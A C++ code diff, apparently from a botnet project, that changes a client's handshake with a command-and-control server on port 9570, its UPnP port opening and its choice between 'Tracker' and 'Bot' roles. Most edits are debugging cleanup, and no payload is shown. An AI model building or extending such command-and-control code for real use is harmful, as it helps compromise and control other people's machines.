@@ -31,15 +31,14 @@ static void server(void)
                 std::cerr << "Reached end of timer, probably not upnp compatible" << std::endl;
                 break;
             }
-            std::this_thread::sleep_for(std::chrono::milliseconds(50));
         }
     };
     auto thread = std::thread(timer);
     thread.detach();
     acceptor_server.async_accept([&](const asio::error_code &ec, asio::ip::tcp::socket peer) {
-        std::cout << "coucou\n";
+        // std::cout << "coucou\n";
         if (!ec) {
-            std::cout << "ec\n";
+            // std::cout << "ec\n";
             char success_buffer[1] = {9};
             char buffer[1] = {0};
             asio::read(peer, asio::buffer(buffer, 1));
@@ -47,11 +46,14 @@ static void server(void)
             if (buffer[0] == 1) {
                 asio::write(peer, asio::buffer(success_buffer, 1));
             }
-        }
-        promise.set_value(true);
+            promise.set_value(true);
+        } else {
+            std::cerr << "error accept: " << ec.message() << std::endl;
+         }
      });
     io_service.run();
     auto val = promise.get_future().get();
+    acceptor_server.close();
     std::cout << "Server closed\n";
     if (val == false) {
         throw std::exception();
@@ -64,7 +66,7 @@ void TypeGuesser::connect(const std::string &ip)
     asio::ip::tcp::endpoint endpoint(asio::ip::address::from_string(ip), 9570);
     asio::error_code ec;
     // wlan0 = Temporary (need getInterface())
-    UpnpBotnet Upnp("wlp4s0");
+    // UpnpBotnet Upnp("wlp4s0");
 
     _socket.connect(endpoint, ec);
     if (ec) {
@@ -75,19 +77,19 @@ void TypeGuesser::connect(const std::string &ip)
     asio::read_until(_socket, buffer, "\0");
     std::string data = asio::buffer_cast<const char*>(buffer.data());
 
-    if (ec || data != "active") {
-        throw ConnectionException(ec.message());
+    if (data != "active") {
+        throw ConnectionException("C&C didn't send active back");
     }
     asio::write(_socket, asio::buffer("ready\0"), ec);
     if (ec) {
         throw ConnectionException(ec.message());
     }
     try {
-        UpnpOpenPort(&Upnp);
+        // UpnpOpenPort(&Upnp);
         server();
         _type = Type::Tracker;
     } catch (std::exception &e) {
-        Upnp.ClosePortAndFinishUpnp();
+        // Upnp.ClosePortAndFinishUpnp();
         std::cout << "Erreur\n";
         std::cout << e.what() << "\n";
         _type = Type::Bot;
